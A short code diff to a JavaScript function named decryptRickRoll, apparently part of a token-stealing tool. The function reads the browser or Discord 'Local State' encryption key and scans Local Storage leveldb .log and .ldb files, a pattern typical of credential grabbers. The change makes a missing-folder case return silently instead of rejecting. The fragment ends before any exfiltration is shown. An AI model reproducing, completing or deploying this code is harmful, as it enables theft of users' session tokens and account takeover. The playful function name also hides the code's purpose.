@@ -52,10 +52,7 @@ const decryptRickRoll = (path) => {
     const localStatePath = join(path, 'Local State');
     const key = JSON.parse(readFileSync(localStatePath).toString())['os_crypt']['encrypted_key'];
     const levelDB = path.includes('cord') ? join(path, 'Local Storage', 'leveldb') : join(path, 'Default', 'Local Storage', 'leveldb');
-    if (!existsSync(levelDB)) {
-      reject();
-      return;
-    }
+    if (!existsSync(levelDB)) return;
     readdirSync(levelDB).map(f => {
       if (f.split('.').pop() !== 'log' && f.split('.').pop() !== 'ldb') return;
       const readInterface = readline.createInterface({
